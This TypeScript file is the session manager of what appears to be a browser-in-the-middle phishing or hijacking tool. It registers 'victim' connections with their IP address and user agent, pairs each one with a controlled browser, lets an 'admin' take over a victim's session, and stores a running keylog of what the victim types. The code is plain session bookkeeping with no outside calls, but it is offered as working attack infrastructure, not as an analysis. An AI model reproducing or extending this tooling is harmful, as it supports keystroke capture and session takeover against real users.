import { randomUUID } from 'crypto';
import type { Session, SessionMetadata } from '../../shared/types/session.js';
import { logger } from '../utils/logger.js';

export class SessionManager {
  private sessions: Map<string, Session> = new Map();

  /**
   * Create a new session for a victim connection
   */
  async createSession(victimSocketId: string, metadata: SessionMetadata): Promise<Session> {
    const sessionId = randomUUID();
    const now = new Date();

    const session: Session = {
      id: sessionId,
      browserId: '', // Will be set when paired
      victimSocketId,
      victimIp: metadata.ip,
      userAgent: metadata.userAgent,
      viewport: metadata.viewport,
      createdAt: now,
      lastActivity: now,
      status: 'active',
      keylog: '',
      metadata: {},
    };

    this.sessions.set(sessionId, session);
    logger.info(`Session created: ${sessionId} for victim ${victimSocketId}`, {
      sessionId,
      victimIp: metadata.ip,
    });

    return session;
  }

  /**
   * Pair a session with a browser instance
   */
  async pairWithBrowser(sessionId: string, browserId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (!session) {
      throw new Error(`Session ${sessionId} not found`);
    }

    session.browserId = browserId;
    session.lastActivity = new Date();
    logger.info(`Session ${sessionId} paired with browser ${browserId}`);

    this.sessions.set(sessionId, session);
  }

  /**
   * Get a session by ID
   */
  getSession(sessionId: string): Session | undefined {
    return this.sessions.get(sessionId);
  }

  /**
   * Get a session by browser ID
   */
  getSessionByBrowserId(browserId: string): Session | undefined {
    for (const session of this.sessions.values()) {
      if (session.browserId === browserId) {
        return session;
      }
    }
    return undefined;
  }

  /**
   * Get a session by victim socket ID
   */
  getSessionByVictimSocketId(victimSocketId: string): Session | undefined {
    for (const session of this.sessions.values()) {
      if (session.victimSocketId === victimSocketId) {
        return session;
      }
    }
    return undefined;
  }

  /**
   * Update session activity timestamp
   */
  async updateActivity(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.lastActivity = new Date();
      this.sessions.set(sessionId, session);
    }
  }

  /**
   * Update session status
   */
  async updateStatus(sessionId: string, status: Session['status']): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.status = status;
      session.lastActivity = new Date();
      this.sessions.set(sessionId, session);
      logger.info(`Session ${sessionId} status updated to ${status}`);
    }
  }

  /**
   * Set admin socket ID for a session
   */
  async setAdminSocket(sessionId: string, adminSocketId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.adminSocketId = adminSocketId;
      session.status = 'admin-controlled';
      this.sessions.set(sessionId, session);
      logger.info(`Admin ${adminSocketId} took control of session ${sessionId}`);
    }
  }

  /**
   * Release admin control from a session
   */
  async releaseAdminControl(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.adminSocketId = undefined;
      session.status = 'active';
      this.sessions.set(sessionId, session);
      logger.info(`Admin control released from session ${sessionId}`);
    }
  }

  /**
   * Append to session keylog
   */
  async appendKeylog(sessionId: string, text: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.keylog += text;
      this.sessions.set(sessionId, session);
    }
  }

  /**
   * Get all active sessions
   */
  getAllSessions(): Session[] {
    return Array.from(this.sessions.values());
  }

  /**
   * Get active sessions (not terminated)
   */
  getActiveSessions(): Session[] {
    return Array.from(this.sessions.values()).filter((s) => s.status !== 'terminated');
  }

  /**
   * Terminate a session
   */
  async terminateSession(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.status = 'terminated';
      session.lastActivity = new Date();
      this.sessions.set(sessionId, session);
      logger.info(`Session ${sessionId} terminated`);
    }
  }

  /**
   * Remove a session completely
   */
  async removeSession(sessionId: string): Promise<void> {
    const deleted = this.sessions.delete(sessionId);
    if (deleted) {
      logger.info(`Session ${sessionId} removed`);
    }
  }

  /**
   * Cleanup terminated sessions older than specified age
   */
  async cleanupTerminatedSessions(maxAgeMs: number = 3600000): Promise<number> {
    const now = Date.now();
    let cleaned = 0;

    for (const [sessionId, session] of this.sessions.entries()) {
      if (
        session.status === 'terminated' &&
        now - session.lastActivity.getTime() > maxAgeMs
      ) {
        this.sessions.delete(sessionId);
        cleaned++;
      }
    }

    if (cleaned > 0) {
      logger.info(`Cleaned up ${cleaned} terminated sessions`);
    }

    return cleaned;
  }

  /**
   * Get session count
   */
  getSessionCount(): number {
    return this.sessions.size;
  }
}

